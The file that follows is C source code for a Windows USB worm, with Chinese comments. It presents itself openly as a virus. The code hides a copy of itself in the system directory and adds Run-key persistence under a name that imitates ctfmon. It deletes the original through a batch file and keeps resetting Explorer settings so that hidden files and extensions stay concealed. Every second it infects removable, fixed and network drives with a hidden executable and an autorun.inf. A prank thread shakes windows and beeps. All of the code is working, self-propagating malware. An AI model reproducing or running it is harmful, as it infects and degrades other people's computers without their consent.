#include <windows.h>
#include <stdio.h>
void Del();  //自删除
int Ganran(int i);    // 感染模块
void WINAPI ScanDisk();  // 实时监控U盘
void WINAPI ScanRege();  // 实时修改注册表
void WINAPI Root();   // 你可以在这里添加一些恶搞代码 留来扩展用 声明为线程函数
char FileDirSystem[MAX_PATH];  // 源病毒体所在位置
char FileName[MAX_PATH]; // 用来保存 自身路径
  
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
//////////////////////////////////////////////////////////////////////////
// 让启动程序时的小漏斗马上消失
GetInputState();
PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
MSG msg;
GetMessage(&msg, NULL, NULL, NULL);
//////////////////////////////////////////////////////////////////////////
GetModuleFileName(NULL,FileName,MAX_PATH);
GetSystemDirectory(FileDirSystem,MAX_PATH);
strcat(FileDirSystem,"\\snss.exe");   
if (strcmp(FileDirSystem,FileName))     // 不在系统目录则进行感染
  Ganran(1);
else
{
  // 创建一条线程用于修改 显示隐藏系统文件、扩展名的选项
  // 看你怎么找到我  嘿嘿
   CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)ScanRege,NULL,NULL,NULL);
  // 创建一条线程用于实时监控U盘
  // 来一个U盘 就得带点东西走
  CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)ScanDisk,NULL,NULL,NULL);
  // 为避免代码出了问题 影响整个程序的运行 用子线程来去完成自己DIY的功能吧
  CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)Root,NULL,NULL,NULL);

// 原本的 主线程应该是要达到 病毒设计者的目的吧    ╮(╯▽╰)╭ 没办法 谁叫我善良呢
  Sleep(999999999); // 主线程进入睡眠状态 累了 是该好好休息啦
  Sleep(999999999);
  Sleep(999999999); // 弄多几个 嘿嘿
  
}
return 0;
}
/********************************************************/
//  你想干什么都可以在这里添加代码 自己看着办哈
/********************************************************/
void WINAPI Root()
{
do
{
  Sleep(10000); // 没事干 每隔10 秒 震动一下窗口 吓唬吓唬他们
  HWND ForeHandle=GetForegroundWindow();
  for(int i=0;i<15;i++)
  {
   RECT rc;
   GetWindowRect(ForeHandle,&rc);
   MoveWindow(ForeHandle,rc.left+8,rc.top+8,rc.right-rc.left,rc.bottom-rc.top,1);
   Sleep(40);
   MoveWindow(ForeHandle,rc.left,rc.top,rc.right-rc.left,rc.bottom-rc.top,1);
   Sleep(40);
   Beep(0x0fff,10);
  }
} while (1);
}

/********************************************************/
//  感染模块
/********************************************************/
int Ganran(int i)
{
if (i)   //  感染系统
{
  CopyFile(FileName,FileDirSystem,FALSE); // 覆盖性自复制至系统目录
  SetFileAttributes(FileDirSystem,FILE_ATTRIBUTE_HIDDEN);
  HKEY RegKey;
   // 开机自启动
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "ctfmonn", 0, REG_SZ, (const BYTE *)&FileDirSystem, MAX_PATH);
  RegCloseKey(RegKey);
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "ctfmonn", 0, REG_SZ, (const BYTE *)&FileDirSystem, MAX_PATH);
  RegCloseKey(RegKey);
  ShellExecute(NULL,"open",FileDirSystem,0,0,SW_HIDE);   // 执行
  Del(); // 自残
  return 1;
}
else // 感染U盘
{
  strcat(FileName,"Test.exe");
  FILE *fp;  
  if ((fp=fopen(FileName,"r"))!=NULL) // 检测病毒是否存在 避免重复感染
  {
   fclose(fp);
   return 1;
  }
  CopyFile(FileDirSystem,FileName,FALSE); // 将自身覆盖性复制到U盘
  SetFileAttributes(FileName,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
  FileName[2]='\0';
  strcat(FileName,"\\autorun.inf");
  if ((fp=fopen(FileName,"w+"))!=NULL)  // 写入autorun.inf文件
  {
      fputs("[AutoRun]\n",fp);
   fputs("OPEN=Test.exe\n",fp);
    fputs("shell\open=打开(&O)\n",fp);
    fputs("shell\open\Command=Test.exe\n",fp);
   fputs("shell\open\Default=1\n",fp);
   fputs("shell\explore=资源管理器(&X)\n",fp);
   fputs("shell\explore\Command=Test.exe",fp);
   fclose(fp);
   SetFileAttributes(FileName,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
  }
  else // 无法写入则返回 要么有读锁，要么已经被免疫
   return 1;
}
}
/********************************************************/
//  自删除功能   
/********************************************************/
void Del()
{
FILE *fp;
fp=fopen("C:\\system.bat","w+");
fprintf(fp,"@echo off \n");
fprintf(fp,":statr\nif not exist \"%s\" goto done\n",FileName);
fprintf(fp,"del /f /q \"%s\" \n",FileName);
fprintf(fp,"goto statr\n");
fprintf(fp,":done\n");
fprintf(fp,"del /f /q %%0\n");
fclose(fp);
ShellExecute(NULL,"open","C:\\system.bat",0,0,SW_HIDE);
}
/********************************************************/
//  修改注册表   想找我 窗户都没有 更别说门了
/********************************************************/
void WINAPI ScanRege()  // 实时修改注册表
{
HKEY RegKey;
DWORD tmp1 = 1; // 扩展名 1隐藏  0显示
DWORD tmp2 = 2;  //Hidden 2 隐藏   1 显示隐藏文件
DWORD tmp0 = 0;  //ShowSuperHidden 0 隐藏  1显示
do
{  
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "CheckedValue", 0, REG_DWORD, (const BYTE *)&tmp1, sizeof(tmp1));
  RegCloseKey( RegKey );
  
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
   0, KEY_ALL_ACCESS, &RegKey);
  RegSetValueEx(RegKey, "Hidden", 0, REG_DWORD, (const BYTE *)&tmp2, sizeof(tmp2));
  RegSetValueEx(RegKey, "ShowSuperHidden", 0, REG_DWORD, (const BYTE *)&tmp0, sizeof(tmp0));
  RegSetValueEx(RegKey, "HideFileExt", 0, REG_DWORD, (const BYTE *)&tmp1, sizeof(tmp1));
  RegCloseKey( RegKey );
  
} while (1);
}
/********************************************************/
//  实时监控U盘，发现U盘立即进行感染
/********************************************************/
void WINAPI ScanDisk()  // 实时监控U盘   USB 盯死你
{
char szDriverName[MAX_PATH];
do
{
  strcpy(szDriverName, "C:\0");

  Sleep(1000); // 每秒监控一次  避免太消耗系统资源
  for( szDriverName[0] = 'C'; szDriverName[0] < 'Z'; szDriverName[0]++ )
  {
   // 感染 移动磁盘、固定磁盘、网络磁盘  管你哪种类型的盘 只要可写 都有份 别急
   if( GetDriveType( szDriverName ) == DRIVE_REMOVABLE || GetDriveType( szDriverName ) == DRIVE_FIXED || GetDriveType( szDriverName ) == DRIVE_REMOTE)
   {
     strcpy(FileName,szDriverName);     
     Ganran(0);
   }
  }
} while (1);
  
}
